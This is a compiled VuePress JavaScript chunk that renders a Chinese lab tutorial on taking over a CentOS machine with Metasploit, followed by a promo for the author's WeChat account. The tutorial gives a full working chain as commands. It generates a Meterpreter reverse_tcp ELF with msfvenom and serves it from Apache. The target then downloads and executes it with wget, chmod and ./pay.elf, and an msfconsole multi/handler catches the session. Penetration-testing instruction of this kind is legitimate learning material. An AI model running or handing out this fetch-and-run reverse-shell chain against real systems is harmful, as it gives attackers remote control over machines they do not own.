(window.webpackJsonp=window.webpackJsonp||[]).push([[141],{607:function(a,s,t){"use strict";t.r(s);var e=t(24),r=Object(e.a)({},(function(){var a=this,s=a.$createElement,t=a._self._c||s;return t("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[t("h1",{attrs:{id:"使用metasploit实现对linux客户端的渗透"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit实现对linux客户端的渗透"}},[a._v("#")]),a._v(" 使用Metasploit实现对Linux客户端的渗透")]),a._v(" "),t("p",[a._v("攻击机 Kali 192.168.175.128")]),a._v(" "),t("p",[a._v("靶机 CentOS 6.5 192.168.175.132")]),a._v(" "),t("h2",{attrs:{id:"生成elf文件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#生成elf文件"}},[a._v("#")]),a._v(" 生成elf文件")]),a._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[a._v("msfvenom -p linux/x86/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".175.128 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("5555")]),a._v(" -f elf "),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" /var/www/html/pay.elf\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("这里，我们将生成的pay.elf文件保存到了/var/www/html/目录下。")]),a._v(" "),t("h2",{attrs:{id:"启动apache服务器"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#启动apache服务器"}},[a._v("#")]),a._v(" 启动apache服务器")]),a._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[a._v("service")]),a._v(" apache2 start\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("h2",{attrs:{id:"在靶机上下载pay-elf"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#在靶机上下载pay-elf"}},[a._v("#")]),a._v(" 在靶机上下载pay.elf")]),a._v(" "),t("p",[a._v("这里，假设我们经过一系列的渗透取得了靶机的权限，在靶机上执行如下命令")]),a._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[a._v("wget")]),a._v(" http://192.168.175.128/pay.elf\n"),t("span",{pre:!0,attrs:{class:"token function"}},[a._v("chmod")]),a._v(" a+x pay.elf\n./pay.elf\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br")])]),t("h2",{attrs:{id:"在攻击机上执行攻击操作"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#在攻击机上执行攻击操作"}},[a._v("#")]),a._v(" 在攻击机上执行攻击操作")]),a._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[a._v("msfconsole\nuse exploit/multi/handler\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" payload linux/x86/meterpreter/reverse_tcp\nsetg LHOST "),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".175.128\nsetg LPORT "),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("5555")]),a._v("\nexploit\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br")])]),t("p",[a._v("这样，我们就可以获取目标服务器的Meterpreter了。")]),a._v(" "),t("h2",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[a._v("#")]),a._v(" 写在最后")]),a._v(" "),t("blockquote",[t("p",[a._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[a._v("冰河技术")]),a._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[a._v("冰河技术")]),a._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[a._v("冰河技术")]),a._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[a._v("冰河技术")]),a._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=r.exports}}]);